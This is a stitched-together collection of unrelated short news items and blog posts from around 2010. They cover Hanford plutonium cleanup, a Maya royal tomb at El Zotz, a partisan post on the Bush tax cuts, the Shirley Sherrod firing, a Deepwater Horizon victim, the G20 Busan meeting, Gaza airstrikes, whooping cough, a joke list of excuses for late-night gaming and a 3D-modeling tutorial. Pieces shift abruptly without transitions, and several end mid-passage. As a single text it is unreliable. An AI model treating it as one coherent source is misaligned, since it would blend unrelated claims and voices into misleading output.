Government officials recognize that they still have a weak grasp of how much plutonium is contaminating the environment .
“ The numbers are changing , ” said Ron Skinnarland , a radiation expert at the Washington State Department of Ecology , which is trying to enforce an agreement it reached with the Energy Department in 1989 for the federal government to clean up Hanford .
So far , the cleanup , which began in the 1990s , has involved moving some contaminated material near the banks of the Columbia to drier locations .
( In fact , the Energy Department ’s cleanup office is called the Office of River Protection . )
The office has begun building a factory that would take the most highly radioactive liquids and sludges from decaying storage tanks and solidify them in glass .
A team of archaeologists led by Stephen Houston has discovered a royal tomb in Guatemala , filled with materials that have been preserved for approximately 1,600 years .
PROVIDENCE , R.I. [ Brown University ] —
A well - preserved tomb of an ancient Maya king has been discovered in Guatemala by a team of archaeologists led by Brown University ’s Stephen Houston .
The tomb is packed with carvings , ceramics , textiles , and the bones of six children , who may have been sacrificed at the time of the king ’s death .
The team uncovered the tomb , which dates from about 350 to 400 A.D. , beneath the El Diablo pyramid in the city of El Zotz in May .
The news was made public yesterday during a press conference in Guatemala City , hosted by the Ministry of Culture and Sports , which authorized the work .
Before making the actual discovery , Houston said the team thought “ something odd ” was happening in the deposit they were digging .
They knew a small temple had been built in front of a sprawling structure dedicated to the sun god , an emblem of Maya rulership .
“ When we sunk a pit into the small chamber of the temple , we hit almost immediately a series of ‘ caches ’ — blood - red bowls containing human fingers and teeth , all wrapped in some kind of organic substance that left an impression in the plaster .
We then dug through layer after layer of flat stones , alternating with mud , which probably is what kept the tomb so intact and airtight . ”
Then on May 29 , 2010 , Houston was with a worker who came to a final earthen layer .
“ I told him to remove it , and then , a flat stone .
We ’d been using a small stick to probe for cavities .
And , on this try , the stick went in , and in , and in .
After chipping away at the stone , I saw nothing but a small hole leading into darkness . ”
They lowered a bare light bulb into the hole , and suddenly Houston saw “ an explosion of color in all directions — reds , greens , yellows . ”
It was a royal tomb filled with organics Houston says he ’d never seen before : pieces of wood , textiles , thin layers of painted stucco , cord .
“ When we opened the tomb , I poked my head in and there was still , to my astonishment , a smell of putrification and a chill that went to my bones , ” Houston said .
“ The chamber had been so well sealed , for over 1600 years , that no air and little water had entered . ”
The tomb itself is about 6 feet high , 12 feet long , and four feet wide .
“ I can lie down comfortably in it , ” Houston said , “ although I would n’t want to stay there . ”
It appears the tomb held an adult male , but the bone analyst , Andrew Scherer , assistant professor of anthropology at Brown , has not yet confirmed the finding .
So far , it seems likely that there are six children in the tomb , some with whole bodies and probably two solely with skulls .
And who was this man ?
Though the findings are still very new , the group believes the tomb is likely from a king they only know about from other hieroglyphic texts — one of Houston ’s specialties in Maya archaeology .
“ These items are artistic riches , extraordinarily preserved from a key time in Maya history , ” said Houston .
“ From the tomb ’s position , time , richness , and repeated constructions atop the tomb , we believe this is very likely the founder of a dynasty . ”

Houston says the tomb shows that the ruler is going into the tomb as a ritual dancer .
He has all the attributes of this role , including many small ‘ bells ’ of shell with , probably , dog canines as clappers .
There is a chance too , that his body , which rested on a raised bier that collapsed to the floor , had an elaborate headdress with small glyphs on them .
One of his hands may have held a sacrificial blade . ”
The stone expert on site , Zachary Hruby , suspects the blade was used for cutting and grinding through bone or some other hard material .
Its surface seems to be covered with red organic residue .
Though the substance still needs to be tested , “ it does n’t take too much imagination to think that this is blood , ” Houston said .
“ We still have a great deal of work to do , ” Houston said .
“ Remember , we ’ve only been out of the field for a few weeks and we ’re still catching our breath after a very difficult , technical excavation .
Royal tombs are hugely dense with information and require years of study to understand .
No other deposits come close . ”
Houston , a 2008 MacArthur fellow , is the Dupee Family Professor of Social Science and professor of anthropology at Brown .
Houston ’s co-director of the site is Edwin Román .
He is working with a group of Brown graduate students and researchers , including Thomas Garrison , a former postdoctoral fellow at the Joukowsky Institute and the Department of Anthropology , and graduate students Sarah Newman , Nick Carter , James Doyle , Alex Knodell , and Alex Smith .
Scherer , the bone analyst , is working with graduate student Kate Blankenship and undergraduate Morgan Ritter - Armour on the laboratory portion of the analysis .
The work at El Zotz has been supported by funding from the National Science Foundation and the National Endowment for the Humanities .
Let us be clear :
No one at the White House is talking about ending Bush ’s tax cuts for those making less than $ 250,000 year .
You can scour news stories and White House announcements all you like , and the Obama Administration ’s intentions regarding the Bush tax cuts have been completely clear since the 2008 campaign .
For example , on television last week Treasury Secretary Tim Geithner discussed letting tax cuts expire for those making more than $ 250,000 a year , which would affect 2 to 3 percent of all Americans .
At a press briefing yesterday , Robert Gibbs said “ The President said that , as he had committed to in the campaign , he would not allow the tax cuts for the middle class to expire . ”
However , if you ’re getting your news from the Republican Noise Machine , you would n’t know that .
You ’d think everyone ’s taxes will be going up .
Today the Usual Tools on the Right Blogosphere are frantically linking to a new “ tax calculator ” at the Heritage Foundation website .
The calculator is supposed to tell how how much YOUR taxes will go up if the Bush tax cuts expire .
In their announcement on the calculator , Heritage uses an example of “ a married couple with two children under 17 earning $ 45,000 a year with no other income ” who will , Heritage says , owe an additional $ 3,002 in taxes next year if the Bush tax cuts are allowed to expire .
Heritage provides absolutely no evidence for its assertion that the Obama Administration plans to allow all the tax cuts to expire .
But of course rightie bloggers assume that what Heritage says must be true , so like good little tools they are properly outraged about “ the largest tax increase in United States history . ”
( Note : in rightiespeak , “ the largest tax increase in United States history ” refers to any change in tax code whatsoever , when enacted by a Democratic Congress . )
What ’s important to remember is that Heritage speaks for its founders and benefactors , who are ( according to Sourcewatch )
* Lynde and Harry Bradley Foundation
* Scaife Foundations : Sarah Mellon Scaife , Scaife Family , Carthage
* John M. Olin Foundation , Inc .
* Castle Rock Foundation
* JM Foundation
* Claude R. Lambe Charitable Foundation
* Philip M. McKenna Foundation , Inc .
* Charles G. Koch Charitable Foundation
* Roe Foundation
* Rodney Fund
* Ruth and Lovett Peters Foundation
* Orville D. and Ruth A. Merillat Foundation
* Bill and Berniece Grewcock Foundation
* Samuel Roberts Noble Foundation
* William H. Donner Foundation
* Walton Family Foundation
* Armstrong Foundation
* John Templeton Foundation
* William E. Simon Foundation
These are foundations set up by families wealthy beyond our imaginations who use rightie think tanks like Heritage to push policies to protect their wealth .
The rightie think tank infrastructure exists to push a number of policies that benefit the extremely wealthy at the expense of everyone else .
One of their more successful propaganda strategies is to convince the rubes that tax increases proposed only for the mega - wealthy are really aimed at everyone , including the hypothetical married couple with two children earning $ 45,000 a year .
Thus the rubes can be stirred up into fear and anger about tax increases that will not touch them at all .
( See , for example , “ GOP Fairy Tales ” by Kevin Drum . )
Another organization pushing the propaganda that President Obama intends to raise taxes on lower - income earners is Americans for Tax Reform , headed by Grover Norquist .
ATR is an astroturf site established by the following foundations ( according to SourceWatch ) :
* Lynde and Harry Bradley Foundation
* Carthage Foundation ; see Scaife Foundations
* JM Foundation
* John M. Olin Foundation
* Sarah Scaife Foundation ; see Scaife Foundations
* R.J. Reynolds
* Philip Morris
* Tobacco Institute
Norquist and his good buddy Jack Abramoff also scammed some Indian tribes into giving money to ATR .
Apparently the chiefs were told they had to make the donations in order to have access to President Bush .
BTW , according to Lori Montgomery at WaPo , here ’s the reason the Bush tax law was written to expire in ten years :
The cuts were written to expire to allow the bill to pass Congress under fast - track budget rules , known as reconciliation , and avoid a filibuster in the Senate .
Just like the final piece of Obama ’s health care overhaul , the tax cuts needed only 50 votes to win Senate approval , instead of the 60 required to shut down a filibuster .
Under reconciliation , legislation may not increase the deficit beyond a 10 - year “ budget window . ”
Because the tax cuts would have increased the deficit , Republicans had to write them to expire in 2011 .
In other words , Congress knew full well that the tax cuts would not magically increase revenue and pay for themselves , although of course no one on the Right was admitting that in public .
And never forget that those tax cuts are the single biggest cause of the current federal budget deficit , the same deficit righties shriek about whenever a Democrat proposes any policy whatsoever .

The White House has been forced to make an embarrassing U - turn after it appeared to have acted rashly in approving the sacking of a senior black official who was being targeted by a controversial rightwing blogger .
The Obama administration had initially supported the decision of Tom Vilsack , the agriculture secretary , to force the resignation of Shirley Sherrod after a misleadingly edited version of a speech she gave in March caused outrage on the internet .
The edited clips , put out by Andrew Breitbart of the conservative site BigGovernment.com , who has worked with the leading rightwing blogger Matt Drudge , gave the impression that Sherrod had boasted about having discriminated against a white farmer 24 years ago .
But when the full footage of the speech was released hours later , it became clear that she was recounting the story as a parable for why every poor person deserved to be helped equally , whatever their race .
In the wake of the full tape becoming available , the White House said the case should be looked at again .
Vilsack , who initially had said his department had a " zero tolerance for discrimination " , also made a startling volte face , promising a " thorough review to ensure to the American people we are providing services in a fair and equitable manner " and offering Sherrod another job in the department .
Last night he went further , saying he had extended his " personal and profound apologies for the pain and discomfort that has been caused to her and to her family over the course of the last several days . "
He added : " A good woman has gone through a very difficult period , and I will have to live with that for a very long time . "
Obama 's press secretary Robert Gibbs also grovelled last night , saying : " A disservice was done .
An apology was owed .
That 's what we 've done . "
Despite such apologies , the damage had already been done with the White House and a key department having acted in haste to force out of office a senior black woman at the whim of rightwing pundits .
To make matters more politically incendiary , it became clear that Breitbart had put together the edited clips in order to hurt the NAACP , America 's largest civil rights organisation .
The NAACP last week locked horns with the Tea Party movement of disaffected rightwingers , accusing it of tolerating bigotry .
Breitbart has admitted he put out the Sherrod video to " show you that people who live in glass houses should not throw stones " .
As the furore swirled , Eloise Spooner , the wife of the white farmer in question , came to Sherrod 's defence , saying : " We probably would n't have our farm today if it had n't been for her . "
Sherrod said she was ordered to resign by Vilsack 's deputy , Cheryl Cook , while she was on a long drive , and was even ordered to pull over on the side of the road and send in her resignation by Blackberry .
The saga also embarrassed the NAACP , which was also over - hasty in judging Sherrod , telling Fox News that it repudiated " racists in our ranks " .
After seeing the full video , it said it had been " snookered " into misinterpreting her views .

Via Raw Story , we hear that one of the Deepwater Horizon crew members was so worried about safety on the oil rig , he wrote his will on his last visit home :
At least one of the eleven men that died in the initial explosion that triggered a disaster in the Gulf expressed concerns about safety practices on the oil rig .
Transocean toolpusher Jason Anderson told his wife , Shelly , that he was concerned about BP 's safety practices on the rig .
Anderson was so worried about an accident that he spent his last trip home getting his affairs in order .
" Everything seemed to be pressing to Jason about getting things in order .
In case something happened .
Teaching me how to do certain things on the motor home so that I could go and do things with the kids , make sure that I knew how to do everything , " an emotional Shelly Anderson told NBC 's Lisa Myers .
Her husband drew up a will and talked about his hopes for their daughter and son .
The last few times Jason called her from the rig he was was clearly worried .
" They were getting pressure from someplace higher up to do things that maybe were n't exactly the way Jason thought that they should be , " she said .
" It was a safety issue . "
" Jason 's father told us Jason was concerned that BP , which controlled the rig , kept wanting to stray from procedures to finish the well faster , which Jason considered unsafe , " Myers reported .
The Transocean CEO sat in the Anderson kitchen and told Shelly how he would take care of her family .
But even before the memorial service could take place , Transocean went to court to limit their overall damages .
" They have n't even let us say good - bye to at least have closure for his memory a little bit , to have time to explain to a 5 - year - old that her daddy is in heaven .
They 're filing these lawsuits to limit us .
They need to just slow down .
Back up , " said Anderson .
Today ’s video gives a unique look at the new , nighttime spectacular at Disney California Adventure park , “ World of Color . ”
This is a VIP view that most of us will never have the chance to see .
While you can get FASTPASS tickets for a ground view of “ World of Color , ” there ’s no FASTPASS ticket that will get you access this high up .
The footage was shot from a fixed - wing aircraft recently at approximately 1,800 feet above Disney California Adventure park .
I particularly like the wide shot where you can see Glow Fest , “ World of Color , ” and the whole city of Anaheim around Disney California Adventure park .

PARAMUS — A 19 - year - old New Jersey man was arrested Thursday after attempting to sell an ounce of marijuana to an undercover officer , according to a report on NorthJersey.com .
Daniel Mertz , of Hillsdale , was arrested by a member of the Bergen County Prosecutor 's Office Narcotics Task Force after a month - long investigation , the report said .
Police searched his vehicle and found $ 910 in cash and additional marijuana , according to the report .
More Paramus news :
That ’s it .
You ’re busted .
It ’s 3 AM .
You ’ve completely lost track of time playing while playing World of Warcraft , Battlefield Bad Company 2 , Mount & Blade , Mass Effect 2 , Sims 3 , or pretty much any other number of games that make time flow faster than it naturally should .
You now have to turn off the lights in the game room , slink slowly across the living space in the dark , and head to bed where your spouse is sleeping …
… very lightly …
If you manage to surgically implant yourself under the blankets without waking your spouse , you ’re home free .
You only have to deal with the inevitable headache that is going to haunt you through the work day which starts in less than 5 hours .
For that , coffee , Red Bull , and 5 - Hour Energy shots are your only hope for survival .
But what if you do get caught ?
What if your spouse rolls over and asks that terrible question , “ Are you just coming to bed NOW ? ! ”
While the truth will set you free , sometimes a little white lie will save you a ton of grief later in life .
When your spouse unexpectedly brings up “ guess who was up until 3 AM this week playing video games ? ” at your next social outing , it ’s difficult to laugh off .
The best you can do is try to change the subject or make a trip to get more beer .
Here ’s what you should say , and – for the love of God – what you should never say when you ’re faced with that awful question by your sleepy , and now angry spouse .
Excuse # 1 . What you should say …
“ My stomach is messed up . ”
I ’ve asked most of my married gamer friends what excuse they use for coming to bed too late .
To most of them , this was their canned excuse .
“ My stomach is messed up . ”
Five simple words that will save you from a ton of grief .
No , you ’re stomach is n’t actually messed up .
You ’ve just put in some quality game time !
But in your spouse ’s eyes , clearly you have n’t been gaming at all .
You ’ve been white - knuckled , gripping anything nearby for support while you fight your intestinal forces of evil .
Your spouse ca n’t help but feel sorry for you .
While they ’ve been happily sleeping in the comfy bed , you ’ve been praying for the sweet release of death in the restroom .
This excuse can be supplemented with “ I hope it was n’t something we BOTH ate . ”
What ’s most likely going to happen …
Your spouse will lean over and say , “ Aww , I ’m sorry honey .
I hope you feel better . ”
Kiss you on the cheek , roll over and all is forgotten .
What might go wrong …
Your spouse may be on to you .
Or your spouse might grow increasingly worried about your health .
You ca n’t use this excuse more than once per two weeks .
If you use this excuse too much , sympathy may be washed away and crankiness may kick back in .
You ‘ll start to hear things like , “ Well , it ’s because you eat like crap .
You eat too many Doritos . ”
Or , “ Maybe you should see your doctor . ”
Whether or not you eat too many Doritos is irrelevant .
Chances are , you probably do n’t .
And if your spouse happens to make an appointment with a virologist for you , good luck explaining to the doctor that you ’re perfectly healthy and that you ’re only up late because like any other gamer , you enjoy dropping an occasional hot Carl Gustav on your enemy ’s tanks .
Still , you do n’t want to throw one of life ’s little niceties like Doritos under the bus just to salvage gaming .
Excuse # 2 . What you should say …
“ I thought I heard someone at the door . ”
This is a perfectly valid excuse .
If someone knocks at your door at 3 AM , it could be anyone .
It could be the police .
It could be someone who ’s car broke down .
It could be someone who wants to murder the hell out of you with your own power tools .
A 3 AM knock on the door must be responded to for the safety of everyone .
This response must be immediately followed up with “… no …
There ’s no one there .
I ’m going back to sleep . ”
What ’s most likely going to happen …
Your significant other will roll over and completely forget the ordeal .
What might go wrong …
Again , this excuse must be used with extreme caution .
This can only be used once in a two - month timespan .
If you continually come ( back ) to bed at 3 AM because you ’re hearing knocks at the door , you ’ll either be diagnosed with paranoia or somnambulism ( That ’s a big word for sleep walking .
Yea… I had to look that one up . ) .
Worse still , if you use it too much , your spouse may become worried about potential break - ins at 3 AM .
That ’s when things really get out of hand .
Your spouse will talk about bettering your home protection initiatives .
While the idea of purchasing a few new guns for the home might sound fun , but before you know it , you ’ll be arming and disarming your elaborate home security system every time you open a window .
And you ’ll be picking up dog poop from the incredibly large German shepherd that was purchased to patrol the grounds .
So … discretion or dog poop .
It ’s your choice .
Excuse # 3 .
What you should say …
“ I was just doing it to catch up with my brother / sister / old college friend / etc . ”
This is one of my personal favorite excuses , most likely because it ’s true 90 % of the time .
As we grew up , most of us have moved away from our perspective homes , or our friends and family have moved away from us .
It ’s important to keep in contact , and what better way to do so than through some quality frag time ?
Everyone knows that families and friends that game together , stay together .
What ’s most likely going to happen …
Your spouse will roll over and completely forget the ordeal but you ’ll probably catch a verbal warning … and an unsteady glare .
What might go wrong …
I highly suggest not using this excuse in a lie .
You may get questioned about the life events of your fellow gamer .
If your spouse is anything like mine , you ’ll be asked for information about the status of your friend ’s relationship with their significant other , baby weights , wedding dates , names , locations and other stuff that I generally hear but forget within 30 seconds .
Here ’s where you ’ll come to a trouble crossroad .
You ’ll either catch hell for not asking enough questions about the lives of fellow gamer or you ’ll get an earload for staying up too late .
Pick your poison .
Excuse # 4 .
What you should say …
“ I just could n’t sleep and I did n’t want to wake you up with my tossing and turning . ”
Ooh .
Are n’t you the considerate one ?
This little lie works even better if your spouse has something big planned for the next day like a presentation or an athletic competition of some sort .
This is probably the best excuse to give you are going to bed in the “ ridiculously early ” hours of the morning between 3:30 AM and 6 AM .
For the love of God , get in the bedroom before your spouse wakes up for work .
What ’s most likely going to happen …
Your partner will thank you for your consideration but still look at you like you ’re an insane person .
What might go wrong …
Your partner will say “ Thanks for not trying to wake me up , but you still did . ”
It is nought good a slepyng hound to wake .
Some people are just plain cranky when you wake them up .
You may get grilled no matter what .
So , receive a tongue lashing for your attempt of consideration or your late night gaming .
Or… you could just sleep on the couch .
Depending on how mad your spouse gets when they wake up , it might be best to go with option # 3 and then suffer the backache in the morning .
Excuse # 5 . What you should say …
“ I was working . ”
This excuse is nearly bulletproof … unless the sounds of your gunfire and exclamations of “ take that you f*# %ing newb ! ” have already been keeping your spouse awake .
Putting in some extra ( fake ) hours for the office runs the potential of making you look like a go - getter .
What ’s most likely going to happen …
Your significant other will probably say “ Oh … I did n’t realize you brought any work home today .
Why did n’t you say anything before I went to bed ? ”
This is easily brushed aside and before you know it , you ’ll pass out on your comfortable mattress .
What might go wrong …
If you keep “ burning the midnight oil , ” your spouse may start to hold a grudge for your employer whether they deserve it or not .
This is never a good thing since they ’re probably your main source of income and it ’s best to not stir the pot with them too much .
Heaven forbid if your spouse brings it up at a work gathering later .
“ Why was _____ working so many late nights last week ? ”
You ’re screwed then .
So , be careful in using this excuse .
While the other excuses may leave you in trouble with your loved ones , this one can potentially leave you in trouble with your cash flow .
No cash flow = no games .
No games = you go back to bed on time … and who the hell wants that ?!
Excuses you should never ever say .
. . ever .
“ I lost track of time . ”
“ I was in an argument on the forum boards . ”
“ I was just up thinking about how much I love you ! ”
“ I was catching up with friends on Facebook / Twitter / MySpace .
By the way , I friended my ex-girlfriend / ex-boyfriend . ”
“ Honey , you would n’t believe this porn clip I ’ve found ! ”
And never ever try the Jedi mind trick .
While during normal waking hours of the day , your geeky humor may get a chuckle out of your spouse , but 3 AM is “ no time for your shenanigans . ”
And then you ’d have to stop yourself from laughing at her bringing up an obviously funny moment from Super Troopers .
You ’re better off using some of the approved excuses listed above .
Or use the truth .
That sometimes works too .
Seattle Public Library Releases the Results of Their Community Survey
I wrote about the survey - taking a few months ago .
The library says that almost 33,000 people took the survey , which means that it's a little less than ten percent of everyone who has a SPL card .
The survey was conducted by consulting firm Berk & Associates , and it cost SPL 's supporting nonprofit the Seattle Public Library Foundation $ 120,000 .
The results , which you can find in PDF form over here , are for the most part unsurprising : People want more materials , more hours of operation , and they use the library 's hold system quite frequently .
( Of course , the people who would go to the library to take these surveys are likely to be the most frequent SPL users , too . )
The majority of respondents said that if they had ten bucks to invest in the library , they would put most of their money into books , with A/V and online resources coming in a distant second and third .
Considering that a good portion of the survey had to do with e-books and technology , that 's kind of a surprise .

BUSAN , South Korea ( Reuters ) - Finance ministers can usually be relied upon to put the best spin on whatever is happening to the global economy .
U.S. Treasury Secretary Timothy Geithner speaks to the media during a news conference of the G20 Finance Ministers and Central Bank Governors meeting in Busan June 5 , 2010 .
REUTERS / Jo Yong - Hak
Not at this weekend ’s Group of 20 meeting in Busan .
The two days of talks were remarkable for ministers ’ candor about the extent of the Europe ’s debt crisis and the imperative of appeasing the bond market , which has compelled Greece to seek a bailout and is circling other strugglers .
“ There is substantial concern about what ’s been occurring in Europe of late and the risks associated with that .
That was reflected not only in the communique but in the discussions we had in the room together , ” Canadian Finance Minister Jim Flaherty said .
Financial markets used to live in thrall of the Group of Seven , the G20’s predecessor as the premier global economic policy - making forum , in case it flagged currency intervention or some other initiative .
For now , at least , the tables are turned .
Held on the weekend of the French Open tennis championships , the Busan G20 was a straight - sets win for bond vigilantes .
“ Those countries with serious fiscal challenges need to accelerate the pace of consolidation , ” read the key line in the communique .
CHANGING THEIR TUNE
Reinforcing the impression of a group on the back foot , ministers abandoned the idea of a universal levy on banks to pay for future bailouts after divisions proved irreconcilable .
And bank lobbying appeared to pay off as several ministers signaled that a lengthy phase - in for new capital rules , aimed at reducing the risk of a re-run of the 2007/08 global financial crisis , was now inevitable .
To be sure , the G20 said public finances had to be brought under control in a way that was growth - friendly and tailor - made for each country ’s needs .
At their previous meeting just six weeks earlier , ministers had also prescribed customized exit strategies .
But they stressed then that countries dependent on fiscal stimulus for growth should maintain their policy support until the recovery was more entrenched and firmly driven by the private sector .
Meeting as the euro fell to a four - year low against the dollar , depressed by fears that Hungary could go the way of Greece , ministers ditched the option of continued stimulus .
Instead , they pledged merely to “ stand ready to safeguard recovery ” and stressed the “ significant challenges ” posed by recent market volatility .
“ We are not out of the woods , ” said Egyptian Finance Minister Youssef Boutros - Ghali , who also heads the International Monetary Fund ’s policy - steering committee .
“ The measures they have been required to implement are fairly tough .
And there are in some areas doubts whether they are able to continue implementing such tough measures , ” he told Reuters .
GEITHNER ON THE LOSING SIDE
One reason why the talks were heated , in the words of a senior South Korean official , was a rearguard action fought by U.S. Treasury Secretary Timothy Geithner , who argued that restoring fiscal sustainability was a task for the medium term .
In a frank letter to his counterparts , Geithner warned that global growth would be sub-par if Europe -- especially Germany -- as well as China and Japan did not boost domestic demand to make up for the retrenchment forced upon overindebted U.S. consumers .
But he could take little comfort from events .
Japan elected a new prime minister , Naoto Kan , who is a fiscal conservative and has floated the idea of raising the national sales tax .
China reaffirmed its current policy stance , giving no hint that it was ready to stoke domestic demand by letting the yuan rise .
And Germany gave short shrift to the view , shared by the IMF , that growth would take a hit in the short term if rich economies cut their budget deficits without adjustments by emerging economies to reduce their reliance on exports .
“ I made no bones about the fact that I share the IMF ’s underlying philosophy only in a very limited way , ” German Finance Minister Wolfgang Schaeuble said .
It is never good news when two of the world ’s biggest economies bicker .
U.S. pressure on Germany to change its monetary policy was one of the factors that unnerved investors in the run-up to the 1987 stock market crash .
The only crumb of comfort for Washington , according to one U.S. official , is that Berlin will not start tightening its belt until 2011 .
SETBACKS ALL ROUND
With Europe signing up for austerity , it is no wonder that pessimists such as U.S. economist Nouriel Roubini see the euro zone heading for stagnation if not recession .
And in the absence of a burst in private sector demand in current account surplus countries such as Germany and China , global economic imbalances could deteriorate again -- especially if a resurgent dollar undercuts the revival in U.S. exports .
The immediate test , though , will be whether bond traders will be convinced by the G20 ’s promise of probity .
“ Noble intentions by advanced economies to bring their budget deficits under control are rubbing up against the harsh reality of a weak and unstable recovery that might increase the need for further stimulus measures , ” said Eswar Prasad , a senior fellow at the Brookings Institution , a Washington think - tank .
Prasad , a trade professor at Cornell University and a former IMF economist , said the G20 had recognized the depth of the public debt morass and the consequent risk of global instability .
“ But the communique is unlikely to give bond markets much confidence that budget deficits will be brought under control with anything approaching the alacrity with which they were run up during the height of the crisis , ” he said .
The G20 is grappling with complex issues .
It is unrealistic to expect magic - bullet solutions from such a diverse group of rich and emerging economies .
But it is tough to put a positive gloss on the Busan meeting .
And , in the end , ministers did not even try .
Gaza City ( CNN ) --
Israel launched a series of airstrikes in Gaza starting late Friday in response to a rocket assault on Ashkelon earlier in the day .
The Israel Defense Forces said the strikes targeted three locations in Gaza : a Hamas " terror - activity site " in the north , a weapons manufacturing site in central Gaza and a weapons smuggling tunnel in Rafah .
The first strike around 11:30 p.m. ( 4:30 p.m. ET ) hit a runway near the compound of the late Palestinian leader Yasser Arafat , which is now occupied by Hamas , according to a CNN stringer at the scene .
Hamas security forces reported eight people wounded from the strike .
The coastal Israeli city of Ashkelon was hit by a rocket fired by Palestinian militants in Gaza early Friday , causing minor damage but no injuries , the Israel Defense Forces spokeswoman said .
Ashkelon , with a population of approximately 125,000 residents , is located about 6 miles ( 10 kilometers ) from the Israel - Gaza border and has been the target of many rockets originating from Gaza -- some wounding residents .
Looking at the World Through a Microscope
When you get bored of looking at the world with your own eyes why not look at it trough a microscope ?
It seems that there are two worlds – the world of huge things that we see everyday ( a tree , a car , etc . . ) and a micro world of incredibly small things .
Just looking at the micro world takes our breath away – it ’s incredibly rich , beautiful and active .
We ’ve heard that even science people after looking at the smallest corners of our world see a god here .
Because of that we make this collection for you .
Most of the pictures on this post series were taken with electron microscope and they are very interesting .

Open your head in Anim8 or and add a collar to the neck , if you have n't already done this .
Save this model as a new file , because you need to delete the head later .
Model your shirt the same way you modeled your head .
This means you can model only one half first , mirror it when it is done , join the solids and merge the points .
The UV - faces can be bigger now , half or full credit card size as an average should do it .
When modeling , be sure that there are 3 points that come out specifically :
Your chest ; the middle should be a bit behind the rest ; and your belly .
Some people tend to do everything too flat , but have the heart to move the points a bit further than where you think they actually belong .
As you see on the picture , my original shirt looks really flat , but I modeled it as if I went to the fitness studio every day .
In the end , it looks more realistic than the normal one .
When you have merged the 2 sides , create a few differences between both sides , or it looks too perfect .
You can adapt the new side to the picture in the background , then it should differ enough from the other side .
If they are still too similar , you can make one sleeve more narrow than the other one or you can lean the end of the shirt a bit .
As you see , I added a fold in the back of the shirt , which I recommend you to do , even though you do n't have one on the photo , but it has got a strong effect .
You can either let the sleeves open or you can close them , but if you do , please consider to let a circle for the arm free .
Note :
It is really helpful when you add the beginning of the arms and the trousers .
Save the half - done torso as a new object and delete the arms and trousers from the shirt .
Give the parts different colors , so you can easily differ between them .
I hope you kept the size - rectangle , if not , copy it back from the head - model .
Delete carefully every point of the head and texture the shirt like you did in step 5 , but this time do it like this :
You need a texture for the front and a texture for the back , if your shirt has something on it .
Do n't use a photo of the back of the shirt , instead shop the pattern away from the shirt and save it as its back .
Now you can't get any clipping mistakes .
Select the whole body , add its texture , move the texture to the right place , select its back and add the back - texture without moving it .
It should be automatically on the right place .
Was she born an extrovert ?

EXTROVERTS are born not made – or at least , that ’s what they say .
But what if it ’s more subtle than that ?
What if we tailor our personalities to our surroundings to make the most of our genes ?
Conventional comparisons between identical and fraternal twins indicate that nearly half of individual differences in personality traits have some underlying genetic cause .
So people have tended to think of personality traits as largely determined by genes , says evolutionary psychologist Aaron Lukaszewski of the University of California at Santa Barbara .
He felt there was a flaw …

 The death of a San Diego baby this week has prompted health officials to call for people of all ages to be immunized against whooping cough .
Seven babies in California have died from whooping cough since January , 2010 .
The illness affects children and adults , but is most serious with infants .
It can cause violent bursts of coughing , sometimes followed by a “ whoop ” sound as those affected gasp for air .
Health officials have declared a whooping cough epidemic in California and statistics indicate this may be the worst outbreak in 50 years .
Elizabeth Rosenblum is a family practitioner at University of California , San Diego Medical Center .
Rosenblum has been treating older kids and even adults for whooping cough .
“ I took care of a patient last year who was actually a physician he just could not stop coughing .
He came in and it turned out it was pertussis .
If you have a cough and it lasts for more then one month one out of five chance you have pertussis , ” Rosenblum says .
And you could pass it on to infants .
Who are most severely affected .
“ The thing is with young babies they get so ill with pertussis and usually happens very quickly , 50 percent of them will end up in the hospital , ” she says .
Video Video unavailable .
Read transcript below .
Most cases of whooping cough can be prevented with a vaccine .
But babies under six months are too young to be fully immunized .
Recent studies have also suggested some mutated strains of the disease may be resistant to the vaccine , including a paper published in Emerging Infectious Diseases earlier this year .
Five of the six most recent cases in San Diego County affected vaccinated children .
Dr. Shane Crotty is a vaccine expert at the La Jolla Institute for Allergy and Immunology .
“ The bacteria is n’t the problem , the vaccine is not the problem , it 's that people are not getting the vaccine , ” Crotty says .
He says the whooping cough vaccine is not 100 percent effective but stops most people from getting sick .
He says the bigger problem is that older children and adults are n’t getting boosters .
Immunity to the disease does not last a lifetime .
The Centers for Disease Control and Prevention recommends children under the age of six receive five doses of the vaccine -– and since the California epidemic , state health officials are also recommending boosters for older kids and adults .
Science has been so successful at nearly eradicating so many childhood diseases , it 's tough to convince a new generation some of these illnesses still pose a threat , Crotty says .
“ Once nobody sees that disease around anymore , say polio or whooping cough or measles , you know you do n’t see people with these diseases , people are less afraid , ” he says .

Part of the U.S. strategy in Afghanistan is creating a “ civilian surge ” by pouring more money into development and aid projects to stabilize the country and win the hearts and minds of the people .
But some aid workers say the “ tsunami of cash ” is a case of quantity over quality .
–JCL
Christian Science Monitor :
The US government strategy for improving its struggling reconstruction efforts in Afghanistan relies heavily on spending more money .
More on bigger and quicker projects , more on aid workers , and more on monitors – a “ civilian surge ” to win hearts and minds .
That should be welcome news to development professionals who have spent careers toiling in ravaged regions with only band - aid budgets .
But in Afghanistan , some aid workers actually argue that the aid flow has become a desperate gambit – throwing too much money with too little thought at the problem .
They say that perhaps less money is more .
Even consultants hired by the US Agency for International Development ( USAID ) to evaluate its Afghan projects drop such hints .
Tucked near the bottom of a new report on a four - year , $ 60 million aid project in the remote northern province of Badakhshan ( detailed in the Monitor ’s investigative piece “ How USAID loses hearts and minds ” ) lies the argument in almost haiku precision :
“ It would have been better to do less , but endow what was done with more staying power . ”

Washington ( CNN ) -- President Barack Obama spoke by telephone Tuesday with Turkish Prime Minister Recep Tayyip Erdogan to express condolences for the deaths and injuries from Israel 's raid on a Turkish ship that was part of a flotilla hauling relief supplies to blockaded Gaza , the White House said .
" The president told Prime Minister Erdogan that the United States is working in close consultation with Israel to help achieve the release of the passengers , including those deceased and wounded , and the ships themselves , " according to the White House statement .
" He also affirmed the United States position in support of a credible , impartial and transparent investigation of the facts surrounding this tragedy . "
A statement posted on the website of the Turkish prime minister 's press office said that in the hour - long conversation , Erdogan called the Israeli attack " an unacceptable act that was illegal and against international practices . "
" Israel is about to face the danger of losing its only friend in the region that made the highest contribution to peace in the region , " Erdogan said in the conversation , according to the website posting .
" The steps that it will take in the coming days will determine its position in the region . "
The White House said Obama cited the importance of finding better ways to provide humanitarian assistance to the people of Gaza without undermining Israel 's security .
The president emphasized the continuing U.S. commitment to working with Israel , Turkey and others " with a stake in a more stable and secure Middle East . "
Israel began releasing activists detained from the Gaza flotilla Tuesday as humanitarian cargo aboard the ships was unloaded and taken into the blockaded Palestinian territory .
At least nine people aboard the ships died in the Israeli raid , which also left seven Israeli soldiers injured .
The First Atomic Bomb Blast , 1945
Printer Friendly Version >>>
